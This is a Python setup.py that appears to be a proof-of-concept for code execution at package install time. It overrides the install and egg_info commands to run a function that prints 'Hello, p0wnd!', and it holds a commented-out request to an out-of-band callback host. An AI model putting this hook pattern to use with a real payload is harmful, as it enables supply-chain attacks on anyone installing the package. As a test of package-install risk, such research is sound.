from setuptools import setup, find_packages
from setuptools.command.install import install
from setuptools.command.egg_info import egg_info



def RunCommand():
    print("Hello, p0wnd!")
    #r = requests.get("https://f5lkj4n9y3gy898qw7mpzun9x03rrqff.oastify.com/worked")

class RunEggInfoCommand(egg_info):
    def run(self):
        RunCommand()
        egg_info.run(self)


class RunInstallCommand(install):
    def run(self):
        RunCommand()
        install.run(self)

setup(
    name = "this_is_poc_fortesting_dontinstall_12345",
    version = "0.0.1",
    license = "MIT",
    packages=find_packages(),
    cmdclass={
        'install' : RunInstallCommand,
        'egg_info': RunEggInfoCommand
    },
)